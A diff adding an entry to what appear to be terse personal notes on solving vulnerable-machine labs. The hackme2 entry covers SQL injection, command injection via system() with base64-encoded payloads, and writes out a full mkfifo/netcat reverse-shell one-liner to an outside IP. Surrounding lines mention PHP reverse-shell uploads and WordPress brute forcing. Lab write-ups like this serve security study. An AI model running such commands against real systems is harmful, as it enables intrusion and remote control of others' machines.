@@ -121,3 +121,5 @@ json unsearialize vuln of webapplication, rce; ps -aux to find process is runnin
   wpscan brute force ID; themes edior with php re sehll;crontab for es
 #### hackme1
   sqli get the auperadmin; php reversehll upload;a abnormal file to get id 0;
+#### hackme2
+  sqli like hackme1; c coded , input box, system("id"), indicates developed by C; system(base64_decode("payload") to bypass cannot type blank); rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.129 8821 >/tmp/f (nc for revershell cannot user -e);
